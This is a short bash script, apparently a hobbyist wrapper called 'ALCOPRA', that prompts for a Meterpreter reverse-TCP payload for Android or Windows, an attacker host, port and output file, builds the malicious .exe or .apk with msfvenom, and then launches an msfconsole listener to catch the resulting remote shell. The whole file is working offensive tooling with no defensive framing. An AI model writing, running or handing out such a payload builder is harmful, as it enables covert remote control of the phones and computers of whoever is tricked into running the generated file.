#!/bin/bash

function a {
echo "welcome "
echo "pleas wint for loding..."
sleep 5
figlet ALCOPRA - J . M
sleep 3
echo "android/meterprreter/reverse_tcp ::( Andriod ) "
echo "windows/meterpreter/reverse_tcp :: ( Windows ) "
read -p "% Enter Your Payload : " pay
sleep 1
echo "press (ifconfig)"
read -p "% Enter Your Host : " host
sleep 1
echo "4447,4444,3337,7773,3335,9991,5551"
read -p "% Enter Your Port : " port
sleep 1
echo "/home/*user*/Desktop/(name.exe or name.apk) "
read -p "% Enter Your foldar : " fold
sleep 1
xterm -e "msfvenom -p $pay LHOST=$host LPORT=$port R > $fold"
sleep 2
echo "Done "
echo "pleas wint ;)"
}
a
function b {
msfconsole -q -x "handler -p $pay -H $host -P $port " 
echo "thank your"
figlet ALCOPRA
}
b
